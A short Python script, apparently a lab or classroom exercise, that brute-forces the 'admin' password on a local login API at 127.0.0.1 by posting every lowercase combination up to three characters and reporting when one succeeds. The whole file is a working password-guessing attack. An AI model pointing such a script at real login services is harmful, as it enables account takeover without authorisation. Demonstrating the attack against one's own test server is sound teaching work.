import time
import requests
import itertools

alfabeto = "abcdefghijklmnopqrstuvwxyz"
url_api = "http://127.0.0.1:8000/login"
usuario_objetivo = "admin"
max_longitud = 3
intentos = 0
encontrado = False

print(f"Iniciando ataque de fuerza bruta contra: {url_api}")
print(f"Objetivo: '{usuario_objetivo}' | Alfabeto: {alfabeto}\n")

inicial = time.time()

sesion = requests.Session()

for longitud in range(1, max_longitud + 1):
    if encontrado:
        break
        
    for combinacion in itertools.product(alfabeto, repeat=longitud):
        intentos += 1
        intento_actual = "".join(combinacion)
        
        datos_login = {
            "username": usuario_objetivo,
            "password": intento_actual
        }
        
        try:
            respuesta = sesion.post(url_api, json=datos_login)
            
            if respuesta.status_code == 200:
                final = time.time()
                duracion = final - inicial
                print(f"\n¡Contraseña encontrada!: '{intento_actual}'")
                print(f"Intentos totales: {intentos}")
                print(f"Tiempo de ejecución: {duracion:.4f} segundos")
                encontrado = True
                break
                
        except requests.exceptions.ConnectionError:
            print(f"\nError de conexión en el intento {intentos}. La Mac saturó sus puertos.")
            encontrado = True 
            break

if not encontrado:
    print(f"\nNO se encontró la contraseña en las longitudes probadas.")